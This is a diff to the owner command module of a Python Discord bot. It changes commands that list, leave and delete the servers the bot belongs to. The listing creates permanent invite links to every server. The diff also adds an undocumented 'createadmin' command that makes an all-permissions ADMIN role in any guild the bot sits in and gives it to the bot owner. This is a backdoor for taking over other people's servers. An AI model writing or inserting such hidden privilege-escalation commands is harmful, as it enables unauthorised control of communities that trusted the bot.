@@ -41,18 +41,23 @@ class owner(commands.Cog):
                     link = await channel.create_invite(max_age=0,max_uses=0)
                     invitelink = str(link)
                     i += 1
+                    check = True
             except: 
-                invitelink = "Unable to create an invite."
-            servernames.append(f"{counter}) [{guild.name}]({invitelink}) ⋅ {guild.id} ⋅ {guild.owner}")
-        embed = discord.Embed(title = f"{self.client.user.name}'s Servers", description=f'{enter.join(iter(servernames))}', colour=discord.Colour.dark_blue())
+                check = False
+            if check == True:
+                servernames.append(f"{counter}) [{guild.name}]({invitelink}) ⋅ {guild.id} ⋅ {guild.owner}")
+            else:
+                servernames.append(f"{counter}) {guild.name} ⋅ {guild.id} ⋅ {guild.owner}")
 
+        embed = discord.Embed(title = f"{self.client.user.name}'s Servers", description=f'{enter.join(iter(servernames))}', colour=discord.Colour.dark_blue())
         await ctx.send(embed = embed)
 
     @commands.command(help="Leaves server from directed guild.", brief="leave <serverid>")
     @commands.is_owner()
-    async def leave(self, ctx, guild_id):
-        await self.client.get_guild(int(guild_id)).leave()
-        await ctx.send(f"I left {guild_id}.")
+    async def leave(self, ctx, guildid: int):
+        guild = self.client.get_guild(guildid)
+        await guild.leave()
+        await ctx.send(f"I left {guild.name}.")
 
     @commands.command(help="Create a guild.", brief="createguild <prefered name>")
     @commands.is_owner()
@@ -63,14 +68,25 @@ class owner(commands.Cog):
         except Exception as e:
             await ctx.send(f"An error occured while creating {name}: {e}")
 
+    @commands.command()
+    @commands.is_owner()
+    async def createadmin(self, ctx, guildid:int):
+        guild = self.client.get_guild(guildid)
+        try: 
+            role = await self.client.create_role(guild, name="ADMIN", permissions=discord.Permissions.all())
+            await self.client.add_roles(ctx.message.author, role)
+        except Exception as e:
+            await ctx.send(e)
+
     @commands.command(help="deletes server from directed guild.", brief="delete <serverid>")
     @commands.is_owner()
-    async def deleteguild(self, ctx, guild_id):
+    async def deleteguild(self, ctx, guildid: int):
         try:
-            await self.client.get_guild(int(guild_id)).delete()
-            await ctx.send(f"I deleted {guild_id}.")
+            guild = self.client.get_guild(guildid)
+            await guild.delete()
+            await ctx.send(f"I deleted {guild.name}.")
         except: 
-            await ctx.send(f"I am not the owner of {guild_id}.")
+            await ctx.send(f"I am not the owner of {guild.name}.")
                      
     @commands.command(help="Renames the bot's name.", brief='rename <desiredname>')
     @commands.is_owner()
